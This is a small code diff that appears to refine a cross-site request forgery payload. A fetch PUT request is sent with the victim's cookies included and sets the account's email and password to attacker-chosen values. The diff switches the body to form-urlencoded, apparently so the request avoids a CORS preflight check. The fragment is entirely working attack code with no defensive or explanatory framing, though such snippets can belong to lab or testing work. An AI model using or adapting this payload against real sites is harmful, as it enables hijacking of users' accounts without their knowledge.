@@ -22,9 +22,9 @@
             try {
                 const response = await fetch(url, {
                     method: "PUT",
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: { 'Content-Type': "application/x-www-form-urlencoded" },
                     credentials: 'include',
-                    body: JSON.stringify({
+                    body: new URLSearchParams({
                         email: "attacker@unsafe.com",
                         password: "Attacker12345"
                     })
